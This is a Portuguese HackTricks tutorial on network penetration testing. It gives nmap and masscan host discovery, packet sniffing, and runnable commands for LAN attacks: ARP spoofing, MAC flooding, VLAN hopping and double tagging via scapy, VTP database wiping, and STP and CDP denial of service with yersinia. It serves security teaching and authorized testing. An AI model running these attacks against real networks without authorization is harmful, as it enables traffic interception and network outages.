# Pentesting de Rede

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Dica de bug bounty**: **inscreva-se** no **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje mesmo e comece a ganhar recompensas de at√© **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descobrindo hosts de fora

Esta ser√° uma **se√ß√£o breve** sobre como encontrar **IPs que respondem** da **Internet**.\
Nesta situa√ß√£o, voc√™ tem algum **escopo de IPs** (talvez at√© mesmo v√°rios **intervalos**) e apenas precisa descobrir **quais IPs est√£o respondendo**.

### ICMP

Esta √© a maneira **mais f√°cil** e **mais r√°pida** de descobrir se um host est√° ativo ou n√£o.\
Voc√™ pode tentar enviar alguns pacotes **ICMP** e **esperar respostas**. A maneira mais f√°cil √© apenas enviar uma **solicita√ß√£o de eco** e esperar pela resposta. Voc√™ pode fazer isso usando um simples `ping` ou usando `fping` para **intervalos**.\
Voc√™ tamb√©m pode usar o **nmap** para enviar outros tipos de pacotes ICMP (isso evitar√° filtros para solicita√ß√£o-resposta de eco ICMP comum).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descoberta de Portas TCP

√â muito comum encontrar filtragem de todos os tipos de pacotes ICMP. Nesse caso, tudo o que voc√™ pode fazer para verificar se um host est√° ativo √© **tentar encontrar portas abertas**. Cada host possui **65535 portas**, ent√£o, se voc√™ tiver um escopo "grande", **n√£o √© poss√≠vel** testar se **cada porta** de cada host est√° aberta ou n√£o, pois isso levaria muito tempo.\
Portanto, o que voc√™ precisa √© de um **scanner de portas r√°pido** ([masscan](https://github.com/robertdavidgraham/masscan)) e uma lista das **portas mais utilizadas:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Voc√™ tamb√©m pode realizar esta etapa com o `nmap`, mas √© mais lento e o `nmap` tem problemas para identificar hosts ativos.

### Descoberta de Portas HTTP

Esta √© apenas uma descoberta de portas TCP √∫til quando voc√™ deseja **focar na descoberta de servi√ßos HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descoberta de Portas UDP

Voc√™ tamb√©m pode tentar verificar se h√° alguma **porta UDP aberta** para decidir se deve **prestar mais aten√ß√£o** a um **host**. Como os servi√ßos UDP geralmente **n√£o respondem** com **nenhum dado** a um pacote de sonda UDP vazio regular, √© dif√≠cil dizer se uma porta est√° sendo filtrada ou aberta. A maneira mais f√°cil de decidir isso √© enviar um pacote relacionado ao servi√ßo em execu√ß√£o e, como voc√™ n√£o sabe qual servi√ßo est√° sendo executado, deve tentar o mais prov√°vel com base no n√∫mero da porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
A linha nmap proposta anteriormente testar√° as **1000 principais portas UDP** em cada host dentro do intervalo **/24**, mas mesmo assim isso levar√° **>20min**. Se precisar de **resultados mais r√°pidos**, voc√™ pode usar o [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24`. Isso enviar√° essas **sondas UDP** para suas **portas esperadas** (para um intervalo /24, isso levar√° apenas 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descoberta de Portas SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqui voc√™ pode encontrar um guia completo de todos os ataques Wifi conhecidos no momento da escrita:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descobrindo hosts de dentro

Se voc√™ estiver dentro da rede, uma das primeiras coisas que voc√™ vai querer fazer √© **descobrir outros hosts**. Dependendo de **quanto barulho** voc√™ pode/quer fazer, diferentes a√ß√µes podem ser realizadas:

### Passivo

Voc√™ pode usar essas ferramentas para descobrir hosts de forma passiva dentro de uma rede conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ativo

Observe que as t√©cnicas comentadas em [_**Descobrindo hosts de fora**_](./#descobrindo-hosts-de-fora) (_Descoberta de Portas TCP/HTTP/UDP/SCTP_) tamb√©m podem ser **aplicadas aqui**.\
No entanto, como voc√™ est√° na **mesma rede** que os outros hosts, voc√™ pode fazer **mais coisas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Ativo

Observe que as t√©cnicas comentadas em _Descobrindo hosts de fora_ ([_**ICMP**_](./#icmp)) tamb√©m podem ser **aplicadas aqui**.\
Mas, como voc√™ est√° na **mesma rede** que os outros hosts, voc√™ pode fazer **mais coisas**:

* Se voc√™ **pingar** um **endere√ßo de broadcast de sub-rede**, o ping deve chegar a **cada host** e eles podem **responder** a **voc√™**: `ping -b 10.10.5.255`
* Ao pingar o **endere√ßo de broadcast da rede**, voc√™ pode at√© encontrar hosts em **outras sub-redes**: `ping -b 255.255.255.255`
* Use a op√ß√£o `-PEPM` do `nmap` para realizar a descoberta de hosts enviando solicita√ß√µes de **echo ICMPv4**, **timestamp** e **m√°scara de sub-rede**: `nmap -PEPM -sP ‚Äìvvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan √© usado para **ligar** computadores por meio de uma **mensagem de rede**. O pacote m√°gico usado para ligar o computador √© apenas um pacote onde um **MAC Dst** √© fornecido e ent√£o ele √© **repetido 16 vezes** dentro do mesmo pacote.\
Em seguida, esse tipo de pacote geralmente √© enviado em um **ethernet 0x0842** ou em um **pacote UDP para a porta 9**.\
Se **nenhum \[MAC]** for fornecido, o pacote √© enviado para o **broadcast ethernet** (e o MAC de broadcast ser√° o que est√° sendo repetido).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneando Hosts

Uma vez que voc√™ tenha descoberto todos os IPs (externos ou internos) que deseja escanear em profundidade, diferentes a√ß√µes podem ser realizadas.

### TCP

* Porta **aberta**: _SYN --> SYN/ACK --> RST_
* Porta **fechada**: _SYN --> RST/ACK_
* Porta **filtrada**: _SYN --> \[SEM RESPOSTA]_
* Porta **filtrada**: _SYN --> mensagem ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Existem 2 op√ß√µes para escanear uma porta UDP:

* Enviar um **pacote UDP** e verificar a resposta _**ICMP unreachable**_ se a porta estiver **fechada** (em v√°rios casos, o ICMP ser√° **filtrado**, ent√£o voc√™ n√£o receber√° nenhuma informa√ß√£o se a porta estiver fechada ou aberta).
* Enviar **datagramas formatados** para obter uma resposta de um **servi√ßo** (por exemplo, DNS, DHCP, TFTP e outros, conforme listado em _nmap-payloads_). Se voc√™ receber uma **resposta**, ent√£o a porta est√° **aberta**.

O **Nmap** ir√° **misturar ambas** as op√ß√µes usando "-sV" (os escaneamentos UDP s√£o muito lentos), mas observe que os escaneamentos UDP s√£o mais lentos do que os escaneamentos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Varredura SCTP

O SCTP funciona ao lado do TCP e UDP. Destinado a fornecer o transporte de dados de telefonia sobre IP, o protocolo duplica muitos dos recursos de confiabilidade do Sistema de Sinaliza√ß√£o 7 (SS7) e sustenta uma fam√≠lia de protocolos maior conhecida como SIGTRAN. O SCTP √© suportado por sistemas operacionais, incluindo IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS e VxWorks.

O nmap oferece duas varreduras diferentes para SCTP: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evas√£o de IDS e IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Mais op√ß√µes do nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelando Endere√ßos IP Internos

Roteadores, firewalls e dispositivos de rede mal configurados √†s vezes **respondem** a sondagens de rede **usando endere√ßos de origem n√£o p√∫blicos**. Voc√™ pode usar o _tcpdump_ para **identificar pacotes** recebidos de **endere√ßos privados** durante os testes. Nesse caso, a interface _eth2_ no Kali Linux √© **acess√≠vel** a partir da **Internet p√∫blica** (Se voc√™ estiver **atr√°s** de um **NAT** ou de um **Firewall**, esse tipo de pacote provavelmente ser√° **filtrado**).
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing permite aprender detalhes de intervalos de IP, tamanhos de sub-rede, endere√ßos MAC e nomes de host revisando quadros e pacotes capturados. Se a rede estiver mal configurada ou o tecido de comuta√ß√£o estiver sob estresse, os atacantes podem capturar material sens√≠vel por meio de sniffing passivo de rede.

Se uma rede Ethernet comutada estiver configurada corretamente, voc√™ ver√° apenas quadros de transmiss√£o e material destinado ao seu endere√ßo MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
√â poss√≠vel, tamb√©m, capturar pacotes de uma m√°quina remota por meio de uma sess√£o SSH com o Wireshark como interface gr√°fica em tempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

O Bettercap √© uma poderosa ferramenta de seguran√ßa de rede que pode ser usada para realizar testes de penetra√ß√£o em redes. Ele fornece uma ampla gama de recursos e funcionalidades para ajudar os profissionais de seguran√ßa a identificar vulnerabilidades e realizar ataques controlados.

Alguns dos recursos do Bettercap incluem:

- Sniffing de pacotes: o Bettercap pode interceptar e analisar o tr√°fego de rede, permitindo que os testadores de penetra√ß√£o identifiquem informa√ß√µes sens√≠veis, como senhas e dados confidenciais.

- Spoofing de MAC e IP: com o Bettercap, √© poss√≠vel falsificar endere√ßos MAC e IP para mascarar a identidade do testador de penetra√ß√£o e realizar ataques de spoofing.

- Ataques de phishing: o Bettercap oferece recursos para realizar ataques de phishing, permitindo que os testadores de penetra√ß√£o simulem ataques de engenharia social e testem a conscientiza√ß√£o dos usu√°rios.

- Inje√ß√£o de c√≥digo: o Bettercap permite a inje√ß√£o de c√≥digo em p√°ginas da web para explorar vulnerabilidades e realizar ataques de inje√ß√£o de c√≥digo.

- Captura de credenciais: com o Bettercap, √© poss√≠vel capturar credenciais de login, como nomes de usu√°rio e senhas, para testar a seguran√ßa de um sistema.

O Bettercap √© uma ferramenta altamente flex√≠vel e personaliz√°vel, permitindo que os testadores de penetra√ß√£o adaptem suas t√©cnicas de ataque √†s necessidades espec√≠ficas de um teste. No entanto, √© importante lembrar que o uso do Bettercap em redes sem autoriza√ß√£o √© ilegal e pode resultar em consequ√™ncias legais graves.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciais

Voc√™ pode usar ferramentas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analisar credenciais de um arquivo pcap ou de uma interface ao vivo.

## Ataques na LAN

### ARP spoofing

O ARP Spoofing consiste em enviar respostas ARP gratuitas para indicar que o IP de uma m√°quina possui o MAC do nosso dispositivo. Em seguida, a v√≠tima ir√° alterar a tabela ARP e entrar√° em contato com nossa m√°quina sempre que quiser entrar em contato com o IP falsificado.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
O **Arpspoof** √© uma t√©cnica de hacking que envolve o envio de pacotes ARP falsificados para uma rede local. Essa t√©cnica permite que um hacker redirecione o tr√°fego de rede entre dois dispositivos, fazendo com que o tr√°fego passe por ele. Isso pode ser usado para interceptar informa√ß√µes confidenciais, como senhas, ou para realizar ataques de nega√ß√£o de servi√ßo. O Arpspoof √© uma ferramenta poderosa para testar a seguran√ßa de uma rede e identificar poss√≠veis vulnerabilidades. No entanto, seu uso indevido pode ser ilegal e √© importante obter permiss√£o adequada antes de realizar qualquer teste de penetra√ß√£o.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Sobrecarga de CAM

Sobrecarregue a tabela CAM do switch enviando muitos pacotes com diferentes endere√ßos MAC de origem. Quando a tabela CAM estiver cheia, o switch come√ßar√° a se comportar como um hub (transmitindo todo o tr√°fego).
```bash
macof -i <interface>
```
Em switches modernos, essa vulnerabilidade foi corrigida.

### Ataques 802.1Q VLAN / DTP

#### Troncos Din√¢micos

**DTP (Dynamic Trunking Protocol)** √© um protocolo de camada de link projetado para fornecer um sistema autom√°tico de troncos. Com o DTP, os switches decidem qual porta funcionar√° no modo trunk (Tronco) e qual n√£o funcionar√°. O uso do **DTP** indica uma **m√° concep√ß√£o da rede**. Os troncos devem ser estritamente onde s√£o necess√°rios e isso deve ser documentado.

**Por padr√£o, todas as portas do switch operam no modo Dynamic Auto.** Isso indica que a porta do switch est√° no modo de inicia√ß√£o de tronco do switch vizinho. **O Pentester precisa se conectar fisicamente ao switch e enviar um quadro DTP Desirable**, que aciona a porta para mudar para o modo trunk. O atacante pode ent√£o enumerar as VLANs usando an√°lise de quadros STP e contornar a segmenta√ß√£o de VLANs criando interfaces virtuais.

Muitos switches suportam o Dynamic Trunking Protocol (DTP) por padr√£o, no entanto, um advers√°rio pode abusar disso para **emular um switch e receber tr√°fego em todas as VLANs**. A ferramenta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) pode capturar uma interface e **informar se o switch est√° no modo padr√£o, trunk, dynamic, auto ou access** (este √∫ltimo evitaria o VLAN hopping). A ferramenta indicar√° se o switch √© vulner√°vel ou n√£o.

Se for descoberto que a rede √© vulner√°vel, voc√™ pode usar o _**Yersinia**_ para lan√ßar um "**enable trunking**" usando o protocolo "**DTP**" e poder√° ver pacotes de rede de todas as VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Para enumerar as VLANs, tamb√©m √© poss√≠vel gerar o quadro DTP Desirable com o script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N√£o interrompa o script sob nenhuma circunst√¢ncia. Ele injeta DTP Desirable a cada tr√™s segundos. **Os canais de trunk criados dinamicamente no switch t√™m uma dura√ß√£o de apenas cinco minutos. Ap√≥s cinco minutos, o trunk √© desativado.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Gostaria de ressaltar que **Access/Desirable (0x03)** indica que o quadro DTP √© do tipo Desirable, o que indica √† porta para mudar para o modo Trunk. E **802.1Q/802.1Q (0xa5)** indica o tipo de encapsulamento **802.1Q**.

Ao analisar os quadros STP, **descobrimos a exist√™ncia das VLANs 30 e 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs espec√≠ficas

Uma vez que voc√™ conhece os IDs das VLANs e os valores dos IPs, voc√™ pode **configurar uma interface virtual para atacar uma VLAN espec√≠fica**.\
Se o DHCP n√£o estiver dispon√≠vel, ent√£o use o _ifconfig_ para configurar um endere√ßo IP est√°tico.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador Autom√°tico de VLAN

O ataque discutido de **Dynamic Trunking e cria√ß√£o de interfaces virtuais e descoberta de hosts dentro** de outras VLANs √© **realizado automaticamente** pela ferramenta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dupla Marca√ß√£o

Se um atacante conhece o valor do **MAC, IP e ID da VLAN do host da v√≠tima**, ele pode tentar **marcar duplamente um quadro** com a VLAN designada e a VLAN da v√≠tima e enviar um pacote. Como a **v√≠tima n√£o poder√° se conectar de volta** ao atacante, a **melhor op√ß√£o para o atacante √© se comunicar via UDP** com protocolos que possam realizar algumas a√ß√µes interessantes (como SNMP).

Outra op√ß√£o para o atacante √© lan√ßar uma **varredura de porta TCP falsificando um IP controlado pelo atacante e acess√≠vel pela v√≠tima** (provavelmente atrav√©s da internet). Em seguida, o atacante pode capturar no segundo host de sua propriedade se ele recebe alguns pacotes da v√≠tima.

![](<../../.gitbook/assets/image (635) (1).png>)

Para realizar esse ataque, voc√™ pode usar o scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmenta√ß√£o de VLAN Lateral <a href="#d679" id="d679"></a>

Se voc√™ tiver **acesso a um switch ao qual est√° conectado diretamente**, voc√™ tem a capacidade de **burlar a segmenta√ß√£o de VLAN** dentro da rede. Simplesmente **altere a porta para o modo trunk** (tamb√©m conhecido como trunk), crie interfaces virtuais com os IDs das VLANs de destino e configure um endere√ßo IP. Voc√™ pode tentar solicitar o endere√ßo dinamicamente (DHCP) ou pode configur√°-lo estaticamente. Isso depende do caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Camada 3

Em redes sem fio para convidados e outros ambientes, as configura√ß√µes de VLAN privada (tamb√©m conhecida como _isolamento de porta_) s√£o usadas para **impedir que os pares interajam** (ou seja, os clientes **se conectam a um ponto de acesso sem fio, mas n√£o podem se comunicar entre si**). Dependendo das ACLs de rede (ou da falta delas), pode ser poss√≠vel enviar pacotes IP para um roteador, que os encaminhar√° de volta para um par vizinho.

Este ataque enviar√° um **pacote especialmente criado para o IP de um cliente, mas com o MAC do roteador**. Em seguida, o **roteador redirecionar√° o pacote para o cliente**. Assim como nos _Ataques de Dupla Marca√ß√£o_, voc√™ pode explorar essa vulnerabilidade controlando um host acess√≠vel pela v√≠tima.

### Ataques VTP

**VTP (VLAN Trunking Protocol)** √© um protocolo projetado para gerenciar centralmente as VLANs. Para acompanhar o banco de dados VLAN atual, os switches verificam n√∫meros de revis√£o especiais. Quando ocorre qualquer atualiza√ß√£o da tabela, o n√∫mero de revis√£o √© incrementado em um. E se um switch detectar uma configura√ß√£o com um n√∫mero de revis√£o maior, ele atualizar√° automaticamente seu banco de dados VLAN.

#### Fun√ß√µes em um dom√≠nio VTP <a href="#ebfc" id="ebfc"></a>

* **VTP Server.** Um switch no papel de VTP Server pode criar novas VLANs, excluir antigas ou alterar informa√ß√µes nas pr√≥prias VLANs. **Ele tamb√©m gera an√∫ncios VTP para os demais membros do dom√≠nio.**
* **VTP Client.** Um switch nessa fun√ß√£o receber√° an√∫ncios VTP espec√≠ficos de outros switches no dom√≠nio para atualizar os bancos de dados VLAN pr√≥prios. Os clientes t√™m limita√ß√µes em sua capacidade de criar VLANs e nem mesmo podem alterar a configura√ß√£o da VLAN localmente. Em outras palavras, **acesso somente leitura.**
* **VTP Transparent.** Nesse modo, o switch n√£o participa dos processos VTP e pode hospedar a administra√ß√£o completa e local de toda a configura√ß√£o VLAN. Ao operar no modo transparente, os switches apenas transmitem an√∫ncios VTP de outros switches sem afetar sua configura√ß√£o VLAN. **Esses switches sempre ter√£o um n√∫mero de revis√£o zero e n√£o podem ser atacados.**

#### Tipos de an√∫ncios <a href="#b384" id="b384"></a>

* **An√∫ncio de Resumo ‚Äî** o an√∫ncio VTP que o VTP server envia a cada **300 segundos (5 minutos).** Esse an√∫ncio armazena o nome do dom√≠nio VTP, a vers√£o do protocolo, o carimbo de data/hora e o valor de hash de configura√ß√£o MD5.
* **An√∫ncio de Subconjunto ‚Äî** este √© o an√∫ncio VTP que √© enviado sempre que ocorre uma altera√ß√£o na configura√ß√£o da VLAN.
* **Solicita√ß√£o de An√∫ncio ‚Äî** √© uma solicita√ß√£o do cliente VTP para o servidor VTP de uma mensagem de An√∫ncio de Resumo. Geralmente enviada em resposta a uma mensagem informando que um switch detectou um An√∫ncio de Resumo com um n√∫mero de revis√£o de configura√ß√£o mais alto.

O VTP pode ser **atacado apenas de uma porta trunk**, porque **os an√∫ncios VTP s√£o apenas transmitidos e recebidos em portas trunk.** **Portanto, ao realizar um pentest ap√≥s atacar o DTP, seu pr√≥ximo alvo pode ser o VTP.** Para atacar o dom√≠nio VTP, voc√™ pode **usar o Yersinia** para **executar uma inje√ß√£o VTP que apagar√° todo o banco de dados de VLAN** e, assim, paralisar a rede.

{% hint style="info" %}
O protocolo VTP possui **tr√™s vers√µes** diferentes. Neste post, o ataque √© contra a primeira vers√£o, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Para apagar todo o banco de dados da VLAN, selecione a op√ß√£o **deletar todas as VLANs VTP**.

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Ataques STP

**Se voc√™ n√£o conseguir capturar quadros BPDU em suas interfaces, √© improv√°vel que voc√™ tenha sucesso em um ataque STP.**

#### **DoS de BPDU STP**

Ao enviar muitos BPDUs TCP (Notifica√ß√£o de Mudan√ßa de Topologia) ou Conf (os BPDUs que s√£o enviados quando a topologia √© criada), os switches ficam sobrecarregados e param de funcionar corretamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque STP TCP**

Quando um TCP √© enviado, a tabela CAM dos switches ser√° apagada em 15s. Em seguida, se voc√™ estiver enviando continuamente esse tipo de pacote, a tabela CAM ser√° reiniciada continuamente (ou a cada 15 segundos) e, quando reiniciada, o switch se comportar√° como um hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Raiz STP**

O atacante simula o comportamento de um switch para se tornar a raiz STP da rede. Em seguida, mais dados passar√£o por ele. Isso √© interessante quando voc√™ est√° conectado a dois switches diferentes.\
Isso √© feito enviando pacotes BPDUs CONF dizendo que o valor de **prioridade** √© menor que a prioridade real do switch raiz atual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se o atacante estiver conectado a 2 switches, ele pode ser a raiz da nova √°rvore e todo o tr√°fego entre esses switches passar√° por ele** (um ataque MITM ser√° realizado).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

O Protocolo de Descoberta CISCO (CDP) √© o protocolo usado pelos dispositivos CISCO para se comunicarem entre si, **descobrir quem est√° ativo** e quais recursos eles possuem.

#### Coleta de Informa√ß√µes <a href="#0e0f" id="0e0f"></a>

**Por padr√£o, o CDP envia an√∫ncios para todas as suas portas.** Mas e se um invasor se conectar a uma porta no mesmo switch? Usando um sniffer de rede, seja o **Wireshark**, **tcpdump** ou **Yersinia**, ele poderia extrair **informa√ß√µes valiosas sobre o pr√≥prio dispositivo**, desde o modelo at√© a vers√£o do Cisco IOS. Usando essas informa√ß√µes, ele ser√° capaz de enumerar a mesma vers√£o do Cisco IOS e encontrar a vulnerabilidade para explor√°-la.

#### Ataque de Sobrecarga CDP <a href="#0d6a" id="0d6a"></a>

Voc√™ pode realizar um ataque de DoS a um switch CISCO esgotando a mem√≥ria do dispositivo simulando dispositivos CISCO reais.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
